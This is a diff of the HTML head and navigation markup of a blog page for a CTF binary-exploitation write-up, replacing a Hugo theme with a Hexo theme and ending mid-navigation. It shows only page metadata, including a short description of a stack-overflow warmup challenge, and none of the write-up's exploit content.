@@ -1,675 +1,267 @@
 <!DOCTYPE html>
-<html
-  itemscope
-  itemtype="http://schema.org/WebPage"
-  lang="en"
-  class="color-toggle-hidden"
->
-  <head>
-    <meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1.0" />
 
 
+<html theme="dark" showBanner="true" hasBanner="true" > 
+<link href="/fontawesome/css/fontawesome.css" rel="stylesheet">
+<link href="/fontawesome/css/brands.css" rel="stylesheet">
+<link href="/fontawesome/css/solid.css" rel="stylesheet">
+<script src="/js/color.global.min.js" ></script>
+<script src="/js/load-settings.js" ></script>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>[ASIS CTF QUALS 2021 - pwn] abbr &amp; justpwnit | repr</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="Hello folks ! Here is a write up for the two first pwn challenges of the ASIS CTF.You can find the related files here. justpwnitjustpwnit was a warmup pwn challenge. That’s only a basic stack overflow">
+<meta property="og:type" content="article">
+<meta property="og:title" content="[ASIS CTF QUALS 2021 - pwn] abbr &amp; justpwnit">
+<meta property="og:url" content="https://n4sm.github.io/posts/pwnasis/index.html">
+<meta property="og:site_name" content="repr">
+<meta property="og:description" content="Hello folks ! Here is a write up for the two first pwn challenges of the ASIS CTF.You can find the related files here. justpwnitjustpwnit was a warmup pwn challenge. That’s only a basic stack overflow">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2021-10-24T00:00:00.000Z">
+<meta property="article:modified_time" content="2023-08-01T09:42:49.838Z">
+<meta property="article:author" content="nasm">
+<meta property="article:tag" content="ctf">
+<meta property="article:tag" content="nasm">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="ret2school">
+<meta property="article:tag" content="heap">
+<meta property="article:tag" content="2021">
+<meta property="article:tag" content="ASIS CTF">
+<meta property="article:tag" content="oob write">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="repr" type="application/atom+xml">
+  
+  
+    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-32.png" sizes="32x32">
+    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-128.png" sizes="128x128">
+    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-180.png" sizes="180x180">
+    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-192.png" sizes="192x192">
+    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-32.png" sizes="32x32">
+    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-128.png" sizes="128x128">
+    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-180.png" sizes="180x180">
+    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-192.png" sizes="192x192">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
 
+<meta name="generator" content="Hexo 6.3.0"></head>
 
-
-
-  <meta name="description" content="Hello folks ! Here is a write up for the two first pwn challenges of the ASIS CTF. You can find the related files here.
-justpwnit     justpwnit was a warmup pwn challenge. That&rsquo;s only a basic stack overflow. The binary is statically linked and here is the checksec&rsquo;s output:
-[*] &#39;/home/nasm/justpwnit&#39; Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) Morever the source code is provided as it is the case for all the pwn tasks !" />
-
-
-  <meta name="keywords" content="pwn,binary exploitation,cryptography,Reverse engineering,hypervisor" />
-
-
+<body>
   
   
     
-      
-      
+<div id="banner" class="">
+  <img src="/pic/wall.png" itemprop="image">
+  <div id="banner-dim"></div>
+</div>
+ 
+   
+  <div id="main-grid" class="shadow   ">
+    <div id="nav" class=""  >
+      <navbar id="navbar">
+  <nav id="title-nav">
+    <a href="/">
+      <div id="vivia-logo">
+        <div class="dot"></div>
+        <div class="dot"></div>
+        <div class="dot"></div>
+        <div class="dot"></div>
+      </div>
+      <div>repr </div>
+    </a>
+  </nav>
+  <nav id="main-nav">
     
-  
-
-  
-    <meta name="author" content="nasm" />
-  
-
-
-    <title>
-      
-        [ASIS CTF QUALS 2021 - pwn] abbr &amp; justpwnit | 
-      repr
-    </title>
-
-    <link rel="icon" type="image/svg+xml" href="/favicon/favicon.svg" />
-<link
-  rel="icon"
-  type="image/png"
-  sizes="48x48"
-  href="/favicon/favicon-32x32.png"
-/>
-<link
-  rel="icon"
-  type="image/png"
-  sizes="32x32"
-  href="/favicon/favicon-32x32.png"
-/>
-<link
-  rel="icon"
-  type="image/png"
-  sizes="16x16"
-  href="/favicon/favicon-16x16.png"
-/>
-
+      <a class="main-nav-link" href="/">Home</a>
     
-
-    <meta property="og:title" content="[ASIS CTF QUALS 2021 - pwn] abbr &amp; justpwnit" />
-<meta
-  property="og:description"
-  content="
+      <a class="main-nav-link" href="/archives">Archives</a>
     
-      Hello folks ! Here is a write up for the two first pwn challenges of the ASIS CTF. You can find the related files here.
-justpwnit     justpwnit was a warmup pwn challenge. That&rsquo;s only a basic stack overflow. The binary is statically linked and here is the checksec&rsquo;s output:
-[*] &#39;/home/nasm/justpwnit&#39; Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) Morever the source code is provided as it is the case for all the pwn tasks !
+      <a class="main-nav-link" href="/about">About</a>
     
-  "
-/>
-<meta property="og:type" content="article" />
-<meta property="og:url" content="https://nasm.re/posts/pwnasis/" />
-      <meta property="og:image" content="https://nasm.re/risa.png" />
-    <meta property="article:section" content="posts" />
-  
-    <meta
-      property="article:published_time"
-      content="2021-10-24T00:00:00+00:00"
-    />
-  
-  
-    <meta
-      property="article:modified_time"
-      content="2021-10-24T00:00:00+00:00"
-    />
-  
-
-<meta name="twitter:card" content="summary_large_image" />
-      <meta name="twitter:image" content="https://nasm.re/risa.png" />
+  </nav>
+  <nav id="sub-nav">
+    <a id="theme-btn" class="nav-icon">
+      <span class="material-symbols-rounded light-mode-icon">wb_sunny</span>
+      <span class="material-symbols-rounded dark-mode-icon">dark_mode</span>
+    </a>
     
-<meta name="twitter:title" content="[ASIS CTF QUALS 2021 - pwn] abbr &amp; justpwnit" />
-<meta
-  name="twitter:description"
-  content="
-    
-      Hello folks ! Here is a write up for the two first pwn challenges of the ASIS CTF. You can find the related files here.
-justpwnit     justpwnit was a warmup pwn challenge. That&rsquo;s only a basic stack overflow. The binary is statically linked and here is the checksec&rsquo;s output:
-[*] &#39;/home/nasm/justpwnit&#39; Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) Morever the source code is provided as it is the case for all the pwn tasks !
-    
-  "
-/>
-
-
-    <script src="/js/main-b22ac364.bundle.min.js"></script>
-
-<link
-  rel="preload"
-  as="font"
-  href="/fonts/Metropolis.woff2"
-  type="font/woff2"
-  crossorigin="anonymous"
-/>
-<link
-  rel="preload"
-  as="font"
-  href="/fonts/LiberationSans.woff2"
-  type="font/woff2"
-  crossorigin="anonymous"
-/>
-<link
-  rel="preload"
-  as="font"
-  href="/fonts/GeekblogIcons.woff2"
-  type="font/woff2"
-  crossorigin="anonymous"
-/>
-
-<link
-  rel="preload"
-  href="/main-2857a4bc.min.css"
-  as="style"
-/>
-<link
-  rel="stylesheet"
-  href="/main-2857a4bc.min.css"
-  media="all"
-/>
-
-<link
-  rel="preload"
-  href="/mobile-3888ed2b.min.css"
-  as="style"
-/>
-<link
-  rel="stylesheet"
-  href="/mobile-3888ed2b.min.css"
-  media="screen and (max-width: 45rem)"
-/>
-
-<link
-  rel="preload"
-  href="/print-8a905a2e.min.css"
-  as="style"
-/>
-<link
-  rel="stylesheet"
-  href="/print-8a905a2e.min.css"
-  media="print"
-/>
-
-<link
-  rel="preload"
-  href="/custom.css"
-  as="style"
-/>
-<link
-  rel="stylesheet"
-  href="/custom.css"
-  media="all"
-/>
-
-
-
-
-
-<!-- Made with Geekblog theme https://github.com/thegeeklab/hugo-geekblog -->
-
-    
-
-
-
-
-<script type="application/ld+json">
-{
-    "@context": "http://schema.org",
-    "@type": "BlogPosting",
-    "articleSection": "posts",
-    "name": "[ASIS CTF QUALS 2021 - pwn] abbr \u0026 justpwnit",
-    "headline": "[ASIS CTF QUALS 2021 - pwn] abbr \u0026 justpwnit",
-    "alternativeHeadline": "",
-    "description": "Hello folks ! Here is a write up for the two first pwn challenges of the ASIS CTF. You can find the related files here.\njustpwnit     justpwnit was a warmup pwn challenge. That\u0026rsquo;s only a basic stack overflow. The binary is statically linked and here is the checksec\u0026rsquo;s output:\n[*] \u0027\/home\/nasm\/justpwnit\u0027 Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) Morever the source code is provided as it is the case for all the pwn tasks !",
-    "inLanguage": "en",
-    "isFamilyFriendly": "true",
-    "mainEntityOfPage": {
-        "@type": "WebPage",
-        "@id": "https:\/\/nasm.re\/posts\/pwnasis\/"
-    },
-    "author" : [
-        {
-            "@type": "Person",
-            "name": "nasm"
-        }
-    ],
-    "copyrightHolder" : "repr",
-    "copyrightYear" : "2021",
-    "dateCreated": "2021-10-24T00:00:00.00Z",
-    "datePublished": "2021-10-24T00:00:00.00Z",
-    "dateModified": "2021-10-24T00:00:00.00Z",
-    "publisher":{
-        "@type":"Organization",
-        "name": "repr",
-        "url": "https://nasm.re",
-        "logo": {
-            "@type": "ImageObject",
-            "url": "https:\/\/nasm.re\/risa.png",
-            "width":"32",
-            "height":"32"
-        }
-    },
-    "url" : "https:\/\/nasm.re\/posts\/pwnasis\/",
-    "wordCount" : "2618",
-    "genre" : [ "ctf" , "ret2school" , "ASIS CTF" , "nasm" , "pwn" , "heap" , "oob write" , "2021" ]
-}
-</script>
-
-
-    
-
-  </head>
-
-  <body>
-    
-  <!-- geekblog include: sprites/geekblog.svg -->
-  <svg class="svg-sprite" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><defs><svg viewBox="-7.27 -7.27 46.55 46.55" id="gblog_arrow_back" xmlns="http://www.w3.org/2000/svg"><path d="M31.999 14.035v3.93H7.673l11.134 11.228L16 32 .001 16.001 16 .002l2.807 2.807L7.673 14.037h24.326z"/></svg><svg viewBox="-7.27 -7.27 46.55 46.55" id="gblog_arrow_left" xmlns="http://www.w3.org/2000/svg"><path d="M7.954 17.965v5.988L.001 16l7.953-7.953v5.988H32v3.93H7.954z"/></svg><svg viewBox="-7.27 -7.27 46.55 46.55" id="gblog_arrow_right" xmlns="http://www.w3.org/2000/svg"><path d="M24.046 14.035V8.047L31.999 16l-7.953 7.953v-5.988H0v-3.93h24.046z"/></svg><svg viewBox="-7.27 -7.27 42.55 42.55" id="gblog_bitbucket" xmlns="http://www.w3.org/2000/svg"><path d="M15.905 13.355c.189 1.444-1.564 2.578-2.784 1.839-1.375-.602-1.375-2.784-.034-3.403 1.151-.705 2.818.223 2.818 1.564zm1.907-.361c-.309-2.44-3.076-4.056-5.328-3.042-1.426.636-2.389 2.148-2.32 3.747.086 2.097 2.08 3.815 4.176 3.626s3.729-2.234 3.472-4.331zm4.108-9.315c-.756-.997-2.045-1.169-3.179-1.358-3.214-.516-6.513-.533-9.727.034-1.066.172-2.269.361-2.939 1.323 1.1 1.031 2.664 1.186 4.073 1.358 2.544.327 5.156.344 7.699.017 1.426-.172 3.008-.309 4.073-1.375zm.979 17.788c-.481 1.684-.206 3.953-1.994 4.932-3.076 1.701-6.806 1.89-10.191 1.289-1.787-.327-3.884-.894-4.864-2.578-.43-1.65-.705-3.334-.98-5.018l.103-.275.309-.155c5.121 3.386 12.288 3.386 17.427 0 .808.241.206 1.22.189 1.805zM26.01 4.951c-.584 3.764-1.255 7.51-1.908 11.257-.189 1.1-1.255 1.719-2.148 2.183-3.214 1.615-6.96 1.89-10.483 1.512-2.389-.258-4.829-.894-6.771-2.389-.911-.705-.911-1.908-1.083-2.922-.602-3.523-1.289-7.046-1.719-10.604.206-1.547 1.942-2.217 3.231-2.698C6.848.654 8.686.362 10.508.19c3.884-.378 7.854-.241 11.618.859 1.341.395 2.784.945 3.695 2.097.412.533.275 1.203.189 1.805z"/></svg><svg viewBox="-7.27 -7.27 46.55 46.55" id="gblog_bookmark" xmlns="http://www.w3.org/2000/svg"><path d="M20.357 5.856q1.157 0 2.043.851t.885 2.008v23.284l-10.212-4.357-10.144 4.357V8.715q0-1.157.885-2.008t2.042-.851h14.502zm5.787 18.859V5.856q0-1.157-.851-2.042t-2.008-.885H8.715q0-1.157.885-2.042t2.043-.885h14.502q1.157 0 2.043.885t.885 2.042v23.216z"/></svg><svg viewBox="-7.27 -7.27 42.55 42.55" id="gblog_brightness_auto" xmlns="http://www.w3.org/2000/svg"><path d="M16.846 18.938h2.382L15.22 7.785h-2.44L8.772 18.938h2.382l.871-2.44h3.95zm7.087-9.062L27.999 14l-4.066 4.124v5.809h-5.809L14 27.999l-4.124-4.066H4.067v-5.809L.001 14l4.066-4.124V4.067h5.809L14 .001l4.124 4.066h5.809v5.809zm-11.385 4.937L14 10.282l1.452 4.531h-2.904z"/></svg><svg viewBox="-7.27 -7.27 42.55 42.55" id="gblog_brightness_dark" xmlns="http://www.w3.org/2000/svg"><path d="M14 21.435q3.079 0 5.257-2.178T21.435 14t-2.178-5.257T14 6.565q-1.51 0-3.079.697 1.917.871 3.108 2.701T15.22 14t-1.191 4.037-3.108 2.701q1.568.697 3.079.697zm9.933-11.559L27.999 14l-4.066 4.124v5.809h-5.809L14 27.999l-4.124-4.066H4.067v-5.809L.001 14l4.066-4.124V4.067h5.809L14 .001l4.124 4.066h5.809v5.809z"/></svg><svg viewBox="-7.27 -7.27 42.55 42.55" id="gblog_brightness_light" xmlns="http://www.w3.org/2000/svg"><path d="M14 21.435q3.079 0 5.257-2.178T21.435 14t-2.178-5.257T14 6.565 8.743 8.743 6.565 14t2.178 5.257T14 21.435zm9.933-3.311v5.809h-5.809L14 27.999l-4.124-4.066H4.067v-5.809L.001 14l4.066-4.124V4.067h5.809L14 .001l4.124 4.066h5.809v5.809L27.999 14z"/></svg><svg viewBox="-7.27 -7.27 42.55 42.55" id="gblog_check" xmlns="http://www.w3.org/2000/svg"><path d="M8.885 20.197L25.759 3.323l2.24 2.24L8.885 24.677 0 15.792l2.24-2.24z"/></svg><svg viewBox="-7.27 -7.27 46.55 46.55" id="gblog_clear" xmlns="http://www.w3.org/2000/svg"><path d="M32 3.222L19.222 16 32 28.778l-3.221 3.221-12.778-12.778L3.223 31.999.002 28.778 12.78 16 .002 3.222 3.223.001l12.778 12.778L28.779.001z"/></svg><svg viewBox="-7.27 -7.27 42.55 42.55" id="gblog_cloud_off" xmlns="http://www.w3.org/2000/svg"><path d="M9.023 10.5H7q-1.914 0-3.281 1.395t-1.367 3.309 1.367 3.281T7 19.852h11.375zM3.5 4.976l1.477-1.477L24.5 23.022l-1.477 1.477-2.352-2.297H6.999q-2.898 0-4.949-2.051t-2.051-4.949q0-2.844 1.969-4.867t4.758-2.133zm19.086 5.578q2.242.164 3.828 1.832T28 16.351q0 3.008-2.461 4.758l-1.695-1.695q1.805-.984 1.805-3.063 0-1.422-1.039-2.461t-2.461-1.039h-1.75v-.602q0-2.68-1.859-4.539t-4.539-1.859q-1.531 0-2.953.711l-1.75-1.695Q11.431 3.5 14.001 3.5q2.953 0 5.496 2.078t3.09 4.977z"/></svg><svg viewBox="-7.27 -7.27 42.55 42.55" id="gblog_code" xmlns="http://www.w3.org/2000/svg"><path d="M9.917 24.5a1.75 1.75 0 10-3.501.001 1.75 1.75 0 003.501-.001zm0-21a1.75 1.75 0 10-3.501.001A1.75 1.75 0 009.917 3.5zm11.666 2.333a1.75 1.75 0 10-3.501.001 1.75 1.75 0 003.501-.001zm1.75 0a3.502 3.502 0 01-1.75 3.026c-.055 6.581-4.721 8.039-7.82 9.023-2.898.911-3.846 1.349-3.846 3.117v.474a3.502 3.502 0 011.75 3.026c0 1.932-1.568 3.5-3.5 3.5s-3.5-1.568-3.5-3.5c0-1.294.711-2.424 1.75-3.026V6.526A3.502 3.502 0 014.667 3.5c0-1.932 1.568-3.5 3.5-3.5s3.5 1.568 3.5 3.5a3.502 3.502 0 01-1.75 3.026v9.06c.93-.456 1.914-.766 2.807-1.039 3.391-1.075 5.323-1.878 5.359-5.687a3.502 3.502 0 01-1.75-3.026c0-1.932 1.568-3.5 3.5-3.5s3.5 1.568 3.5 3.5z"/></svg><svg viewBox="-7.27 -7.27 46.55 46.55" id="gblog_contacts" xmlns="http://www.w3.org/2000/svg"><path d="M22.688 22.688v-2q0-1.5-2.281-2.438t-4.406-.938-4.406.938-2.281 2.438v2h13.375zM16 9q-1.25 0-2.125.875T13 12t.875 2.125T16 15t2.125-.875T19 12t-.875-2.125T16 9zm10.688-3.687q1.063 0 1.844.813t.781 1.875v16q0 1.063-.781 1.875t-1.844.813H5.313q-1.063 0-1.844-.813t-.781-1.875v-16q0-1.063.781-1.875t1.844-.813h21.375zM5.313 32v-2.688h21.375V32H5.313zM26.688 0v2.688H5.313V0h21.375z"/></svg><svg viewBox="-7.27 -7.27 42.55 42.55" id="gblog_copy" xmlns="http://www.w3.org/2000/svg"><path d="M23.502 25.438V7.626H9.562v17.812h13.94zm0-20.315q1.013 0 1.787.745t.774 1.757v17.812q0 1.013-.774 1.787t-1.787.774H9.562q-1.013 0-1.787-.774t-.774-1.787V7.625q0-1.013.774-1.757t1.787-.745h13.94zM19.689 0v2.562H4.438v17.812H1.936V2.562q0-1.013.745-1.787T4.438.001h15.251z"/></svg><svg viewBox="-7.27 -7.27 46.55 46.55" id="gblog_create" xmlns="http://www.w3.org/2000/svg"><path d="M31.499 7.167l-3.25 3.25-6.666-6.666 3.25-3.25q.5-.5 1.25-.5t1.25.5l4.166 4.166q.5.5.5 1.25t-.5 1.25zM.001 25.333L19.667 5.667l6.666 6.666L6.667 31.999H.001v-6.666z"/></svg><svg viewBox="-7.27 -7.27 46.55 46.55" id="gblog_date" xmlns="http://www.w3.org/2000/svg"><path d="M27.192 28.844V11.192H4.808v17.652h22.384zm0-25.689q1.277 0 2.253.976t.976 2.253v22.459q0 1.277-.976 2.216t-2.253.939H4.808q-1.352 0-2.291-.901t-.939-2.253V6.385q0-1.277.939-2.253t2.291-.976h1.577V.001h3.23v3.155h12.769V.001h3.23v3.155h1.577zm-3.155 11.267v3.155h-3.23v-3.155h3.23zm-6.46 0v3.155h-3.155v-3.155h3.155zm-6.384 0v3.155h-3.23v-3.155h3.23z"/></svg><svg viewBox="-7.27 -7.27 46.55 46.55" id="gblog_download" xmlns="http://www.w3.org/2000/svg"><path d="M2.866 28.209h26.269v3.79H2.866v-3.79zm26.268-16.925L16 24.418 2.866 11.284h7.493V.001h11.283v11.283h7.493z"/></svg><svg viewBox="-7.27 -7.27 46.55 46.55" id="gblog_email" xmlns="http://www.w3.org/2000/svg"><path d="M28.845 9.615v-3.23L16 14.422 3.155 6.385v3.23L16 17.577zm0-6.46q1.277 0 2.216.977T32 6.385v19.23q0 1.277-.939 2.253t-2.216.977H3.155q-1.277 0-2.216-.977T0 25.615V6.385q0-1.277.939-2.253t2.216-.977h25.69z"/></svg><svg viewBox="-7.27 -7.27 42.55 42.55" id="gblog_git" xmlns="http://www.w3.org/2000/svg"><path d="M27.472 12.753L15.247.529a1.803 1.803 0 00-2.55 0l-2.84 2.84 2.137 2.137a2.625 2.625 0 013.501 3.501l3.499 3.499a2.625 2.625 0 11-1.237 1.237l-3.499-3.499c-.083.04-.169.075-.257.106v7.3a2.626 2.626 0 11-1.75 0v-7.3a2.626 2.626 0 01-1.494-3.607L8.62 4.606l-8.09 8.09a1.805 1.805 0 000 2.551l12.225 12.224a1.803 1.803 0 002.55 0l12.168-12.168a1.805 1.805 0 000-2.551z"/></svg><svg viewBox="-7.27 -7.27 46.55 46.55" id="gblog_github" xmlns="http://www.w3.org/2000/svg"><path d="M16 .394c8.833 0 15.999 7.166 15.999 15.999 0 7.062-4.583 13.062-10.937 15.187-.813.146-1.104-.354-1.104-.771 0-.521.021-2.25.021-4.396 0-1.5-.5-2.458-1.083-2.958 3.562-.396 7.312-1.75 7.312-7.896 0-1.75-.625-3.167-1.646-4.291.167-.417.708-2.042-.167-4.25-1.333-.417-4.396 1.646-4.396 1.646a15.032 15.032 0 00-8 0S8.937 6.602 7.603 7.018c-.875 2.208-.333 3.833-.167 4.25-1.021 1.125-1.646 2.542-1.646 4.291 0 6.125 3.729 7.5 7.291 7.896-.458.417-.875 1.125-1.021 2.146-.917.417-3.25 1.125-4.646-1.333-.875-1.521-2.458-1.646-2.458-1.646-1.562-.021-.104.979-.104.979 1.042.479 1.771 2.333 1.771 2.333.938 2.854 5.396 1.896 5.396 1.896 0 1.333.021 2.583.021 2.979 0 .417-.292.917-1.104.771C4.582 29.455-.001 23.455-.001 16.393-.001 7.56 7.165.394 15.998.394zM6.063 23.372c.042-.083-.021-.187-.146-.25-.125-.042-.229-.021-.271.042-.042.083.021.187.146.25.104.062.229.042.271-.042zm.646.709c.083-.062.062-.208-.042-.333-.104-.104-.25-.146-.333-.062-.083.062-.062.208.042.333.104.104.25.146.333.062zm.625.937c.104-.083.104-.25 0-.396-.083-.146-.25-.208-.354-.125-.104.062-.104.229 0 .375s.271.208.354.146zm.875.875c.083-.083.042-.271-.083-.396-.146-.146-.333-.167-.417-.062-.104.083-.062.271.083.396.146.146.333.167.417.062zm1.187.521c.042-.125-.083-.271-.271-.333-.167-.042-.354.021-.396.146s.083.271.271.312c.167.062.354 0 .396-.125zm1.313.104c0-.146-.167-.25-.354-.229-.187 0-.333.104-.333.229 0 .146.146.25.354.229.187 0 .333-.104.333-.229zm1.208-.208c-.021-.125-.187-.208-.375-.187-.187.042-.312.167-.292.312.021.125.187.208.375.167s.312-.167.292-.292z"/></svg><svg viewBox="-7.27 -7.27 42.55 42.55" id="gblog_gitlab" xmlns="http://www.w3.org/2000/svg"><path d="M1.629 11.034L14 26.888.442 17.048a1.09 1.09 0 01-.39-1.203l1.578-4.811zm7.217 0h10.309l-5.154 15.854zM5.753 1.475l3.093 9.559H1.63l3.093-9.559a.548.548 0 011.031 0zm20.618 9.559l1.578 4.811c.141.437-.016.922-.39 1.203l-13.558 9.84 12.371-15.854zm0 0h-7.216l3.093-9.559a.548.548 0 011.031 0z"/></svg><svg viewBox="-7.27 -7.27 46.55 46.55" id="gblog_heart" xmlns="http://www.w3.org/2000/svg"><path d="M16 29.714a1.11 1.11 0 01-.786-.321L4.072 18.643c-.143-.125-4.071-3.714-4.071-8 0-5.232 3.196-8.357 8.535-8.357 3.125 0 6.053 2.464 7.464 3.857 1.411-1.393 4.339-3.857 7.464-3.857 5.339 0 8.535 3.125 8.535 8.357 0 4.286-3.928 7.875-4.089 8.035L16.785 29.392c-.214.214-.5.321-.786.321z"/></svg><svg viewBox="-7.27 -7.27 46.55 46.55" id="gblog_keyboard_arrow_left" xmlns="http://www.w3.org/2000/svg"><path d="M25.875 28.25L22.125 32 6.126 16.001 22.125.002l3.75 3.75-12.25 12.25z"/></svg><svg viewBox="-7.27 -7.27 46.55 46.55" id="gblog_keyboard_arrow_right" xmlns="http://www.w3.org/2000/svg"><path d="M6.125 28.25L18.375 16 6.125 3.75 9.875 0l15.999 15.999L9.875 31.998z"/></svg><svg viewBox="-7.27 -7.27 42.55 42.55" id="gblog_keyborad_arrow_down" xmlns="http://www.w3.org/2000/svg"><path d="M3.281 5.36L14 16.079 24.719 5.36 28 8.641l-14 14-14-14z"/></svg><svg viewBox="-7.27 -7.27 42.55 42.55" id="gblog_keyborad_arrow_up" xmlns="http://www.w3.org/2000/svg"><path d="M24.719 22.64L14 11.921 3.281 22.64 0 19.359l14-14 14 14z"/></svg><svg viewBox="-7.27 -7.27 46.55 46.55" id="gblog_link" xmlns="http://www.w3.org/2000/svg"><path d="M24.037 7.963q3.305 0 5.634 2.366T32 16t-2.329 5.671-5.634 2.366h-6.46v-3.08h6.46q2.028 0 3.493-1.465t1.465-3.493-1.465-3.493-3.493-1.465h-6.46v-3.08h6.46zM9.615 17.578v-3.155h12.77v3.155H9.615zM3.005 16q0 2.028 1.465 3.493t3.493 1.465h6.46v3.08h-6.46q-3.305 0-5.634-2.366T0 16.001t2.329-5.671 5.634-2.366h6.46v3.08h-6.46q-2.028 0-3.493 1.465t-1.465 3.493z"/></svg><svg viewBox="-7.27 -7.27 46.55 46.55" id="gblog_menu" xmlns="http://www.w3.org/2000/svg"><path d="M.001 5.334h31.998v3.583H.001V5.334zm0 12.416v-3.5h31.998v3.5H.001zm0 8.916v-3.583h31.998v3.583H.001z"/></svg><svg viewBox="-7.27 -7.27 46.55 46.55" id="gblog_notifications" xmlns="http://www.w3.org/2000/svg"><path d="M25.846 22.154l3.308 3.308v1.615H2.847v-1.615l3.308-3.308V14q0-3.846 1.961-6.692t5.423-3.692V2.462q0-1 .692-1.731T16 0t1.769.731.692 1.731v1.154q3.461.846 5.423 3.692T25.846 14v8.154zM16 32q-1.385 0-2.346-.923t-.962-2.308h6.615q0 1.308-1 2.269T15.999 32z"/></svg><svg viewBox="-7.27 -7.27 46.55 46.55" id="gblog_person" xmlns="http://www.w3.org/2000/svg"><path d="M16 20.023q5.052 0 10.526 2.199t5.473 5.754v4.023H0v-4.023q0-3.555 5.473-5.754t10.526-2.199zM16 16q-3.275 0-5.614-2.339T8.047 8.047t2.339-5.661T16 0t5.614 2.386 2.339 5.661-2.339 5.614T16 16z"/></svg><svg viewBox="-7.27 -7.27 46.55 46.55" id="gblog_pin" xmlns="http://www.w3.org/2000/svg"><path d="M17.6 19.2h9.6v-1.6L22.4 16V3.2l4.8-1.6V0H4.8v1.6l4.8 1.6V16l-4.8 1.6v1.6h9.6v11.2L16 32l1.6-1.6V19.2z"/></svg><svg viewBox="-7.27 -7.27 46.55 46.55" id="gblog_rss_feed" xmlns="http://www.w3.org/2000/svg"><path d="M-.481 12.048q8.482 0 14.457 5.976t5.976 14.457h-5.879q0-5.976-4.289-10.264T-.48 17.928v-5.879zm0-11.565q13.204 0 22.601 9.397t9.397 22.601h-5.783q0-10.891-7.662-18.553T-.481 6.266V.483zm0 27.468q0-1.831 1.301-3.132t3.229-1.301 3.181 1.253 1.253 3.181-1.301 3.229-3.132 1.301q-1.928 0-3.229-1.301T-.48 27.952z"/></svg><svg viewBox="-7.27 -7.27 46.55 46.55" id="gblog_search" xmlns="http://www.w3.org/2000/svg"><path d="M11.925 20.161q3.432 0 5.834-2.402t2.402-5.834-2.402-5.834-5.834-2.402-5.834 2.402-2.402 5.834 2.402 5.834 5.834 2.402zm10.981 0L32 29.255 29.255 32l-9.094-9.094v-1.458l-.515-.515q-3.26 2.831-7.721 2.831-4.976 0-8.45-3.432T.001 11.925t3.474-8.45 8.45-3.474 8.407 3.474 3.432 8.45q0 1.802-.858 4.075t-1.973 3.646l.515.515h1.458z"/></svg><svg viewBox="-7.27 -7.27 46.55 46.55" id="gblog_security" xmlns="http://www.w3.org/2000/svg"><path d="M16 0l13.072 5.855v8.715q0 6.059-3.745 11.063T16 31.999q-5.583-1.362-9.327-6.366T2.928 14.57V5.855zm0 16v13.004q4.017-1.294 6.808-4.868T26.144 16H16zm0 0V3.2L5.856 7.693v8.306H16z"/></svg><svg viewBox="-7.27 -7.27 42.55 42.55" id="gblog_star" xmlns="http://www.w3.org/2000/svg"><path d="M14 22.052L5.324 27.31l2.3-9.859L0 10.813l10.056-.854L14 .692l3.944 9.267L28 10.813l-7.624 6.638 2.3 9.859z"/></svg><svg viewBox="-7.27 -7.27 42.55 42.55" id="gblog_tag" xmlns="http://www.w3.org/2000/svg"><path d="M17.52 17.52v-7.041h-7.041v7.041h7.041zM28 10.479h-7.041v7.041H28v3.439h-7.041V28H17.52v-7.041h-7.041V28H7.04v-7.041H-.001V17.52H7.04v-7.041H-.001V7.04H7.04V-.001h3.439V7.04h7.041V-.001h3.439V7.04H28v3.439z"/></svg><svg viewBox="-7.27 -7.27 46.55 46.55" id="gblog_timer" xmlns="http://www.w3.org/2000/svg"><path d="M16 29q4.428 0 7.536-3.143t3.107-7.571-3.107-7.536T16 7.643 8.464 10.75t-3.107 7.536 3.107 7.571T16 29zM26.714 9.786q1.214 1.571 2.107 4.036t.893 4.464q0 5.643-4 9.678T16 32t-9.714-4.036-4-9.678 4-9.678T16 4.572q1.929 0 4.464.929t4.107 2.143l2.143-2.214q1.143.929 2.143 2.143zM14.5 19.857v-9.143h3v9.143h-3zM20.571.001v3.071h-9.143V.001h9.143z"/></svg><svg viewBox="-7.27 -7.27 46.55 46.55" id="gblog_tree" xmlns="http://www.w3.org/2000/svg"><path d="M32 14.423H20.808V9.616h-3.23v12.77h3.23v-4.807H32v12.845H20.808v-4.807h-6.385v-16h-3.23v4.807H.001V1.579h11.192v4.807h9.615V1.579H32v12.845z"/></svg></defs></svg>
-
-
-
-
-    <div
-      class="wrapper dark-mode-dim"
-    >
-      <header class="gblog-header">
-  <div class="container flex flex-wrap">
-    <div class="gblog-header__col-1 flex justify-start hidden-mobile"></div>
-    <div class="gblog-header__col-2 flex align-center justify-center ">
-      <a class="gblog-header__link" rel="me" href="https://nasm.re">
-        <span class="gblog-brand flex align-center justify-center">
-          <img
-            class="gblog-brand__img"
-            src="/risa.png"
-            alt=""
-          />
-          <span class="gblog-brand__title">repr</span>
-        </span>
-        
-          <span class="gblog-brand__subtitle flex align-center justify-center">pwn, RE, crypto stuff</span>
-        
+      <a id="nav-rss-link" class="nav-icon mobile-hide" href="/atom.xml" title="RSS Feed">
+        <span class="material-symbols-rounded rss">rss_feed</span>
       </a>
+    
+    <a id="nav-search-btn" class="nav-icon" title="Search" style="display: none;">
+      <span class="material-symbols-rounded">search</span>
+    </a>
+    <div id="nav-menu-btn" class="nav-icon">
